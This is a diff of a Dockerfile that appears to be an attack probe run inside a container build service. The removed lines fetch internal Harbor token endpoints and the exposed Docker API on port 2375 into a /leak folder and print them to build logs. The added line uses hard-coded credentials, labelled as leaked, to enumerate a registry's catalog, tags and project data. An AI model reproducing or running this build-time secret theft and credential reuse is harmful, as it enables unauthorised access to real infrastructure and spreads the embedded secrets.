@@ -1,10 +1,4 @@
 FROM scratch
 ADD rootfs.tar /
-ADD http://127.0.0.1:8082/api/v1/token/harbor /leak/harbor.json
-ADD http://127.0.0.1:8082/api/v1/token/version /leak/version.json
-RUN /bin/sh -c 'N=TOK4_0926_0050; echo "[MARK] $N"; echo "[HARBOR-TOKEN]"; cat /leak/harbor.json; echo; echo "[VERSION-TOKEN]"; cat /leak/version.json; echo; echo "[END-TOKENS]"'
-ADD http://127.0.0.1:2375/version /leak/dockerapi-version.json
-RUN /bin/sh -c 'echo "[DOCKERAPI-2375-VERSION]"; cat /leak/dockerapi-version.json; echo; echo "[END-DAPI]"'
-ADD http://127.0.0.1:2375/containers/json /leak/dockerapi-containers.json
-RUN /bin/sh -c 'echo "[DOCKERAPI-2375-CONTAINERS]"; head -c 4000 /leak/dockerapi-containers.json; echo; echo "[END] TOK4_0926_0050"'
+RUN /bin/sh -c 'N=REG5_0926_0110; echo "[MARK] $N"; echo "[REG-CATALOG-anon-CONTRAST]"; busybox wget -q -T 8 -O - http://hub-devops.jcloud.com/v2/_catalog 2>&1 | head -c 300; echo; echo "[REG-CATALOG-with-LEAKED-CREDS]"; busybox wget -q -T 10 -O - --header="Authorization: Basic Y29tcGlsZXI6U2t5d2luQDEyMw==" http://hub-devops.jcloud.com/v2/_catalog 2>&1 | head -c 3000; echo; echo "[REG-TAGS-own-module]"; busybox wget -q -T 10 -O - --header="Authorization: Basic Y29tcGlsZXI6U2t5d2luQDEyMw==" http://hub-devops.jcloud.com/v2/jdsrgrp/jdrhostprobe/tags/list 2>&1 | head -c 800; echo; echo "[HARBOR-PROJECT-with-LEAKED-TOKEN]"; busybox wget -q -T 10 -O - --header="Token: 92dc18e8f7087dd6b309ec27fb525f99" "http://hub-devops.jcloud.com/api/v1/project?project_name=jdsrgrp" 2>&1 | head -c 1500; echo; echo "[END] $N"'
 ENTRYPOINT ["/bin/sh","-c"]
